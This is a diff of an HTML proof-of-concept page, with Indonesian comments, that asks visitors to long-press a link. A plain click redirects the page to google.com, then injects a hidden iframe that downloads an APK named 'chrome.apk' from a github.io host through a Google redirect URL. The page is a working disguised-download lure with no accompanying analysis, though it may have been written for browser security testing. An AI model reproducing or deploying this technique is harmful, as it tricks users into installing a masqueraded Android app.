@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Combined Action</title>
+    <title>PoC Long-Press Combined Action</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -17,7 +17,7 @@
         .container {
             margin-top: 30px;
         }
-        button {
+        a.button-link {
             display: inline-block;
             width: 80%;
             max-width: 400px;
@@ -30,10 +30,11 @@
             color: white;
             border: none;
             border-radius: 6px;
+            text-decoration: none;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             transition: background 0.2s;
         }
-        button:hover {
+        a.button-link:hover {
             background-color: #1557b0;
         }
     </style>
@@ -41,29 +42,34 @@
 <body>
 
     <h1>PoC Test Page</h1>
-    <p>Klik tombol di bawah untuk menjalankan aksi gabungan:</p>
+    <p>Silakan <b>long-press</b> tautan di bawah dan pilih <b>"Open in new window"</b>:</p>
 
     <div class="container">
-        <button id="actionBtn">Execute Action</button>
+        <!-- Tautan menggunakan atribut href standar agar fitur long-press browser Android aktif -->
+        <a href="https://www.google.com" 
+           class="button-link" 
+           id="targetLink" 
+           target="_blank" 
+           rel="noopener noreferrer">
+            Open New Window & Download
+        </a>
     </div>
 
     <script>
-        document.getElementById('actionBtn').addEventListener('click', function() {
-            // 1. Membuka jendela baru ke google.com
-            window.open('https://www.google.com', '_blank');
-
-            // 2. Halaman saat ini melakukan redirect ke google.com setelah jeda singkat
+        document.getElementById('targetLink').addEventListener('click', function(e) {
+            // Jika diklik biasa (bukan long-press ke tab baru), jalankan alur berurutan:
+            // 1. Halaman utama redirect ke Google
             setTimeout(function() {
                 window.location.href = "https://www.google.com";
-            }, 800);
+            }, 500);
 
-            // 3. Memicu pop-up download file APK di akhir proses
+            // 2. Memicu pop-up download file APK di akhir proses
             setTimeout(function() {
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
                 document.body.appendChild(iframe);
-            }, 1500);
+            }, 1200);
         });
     </script>
 
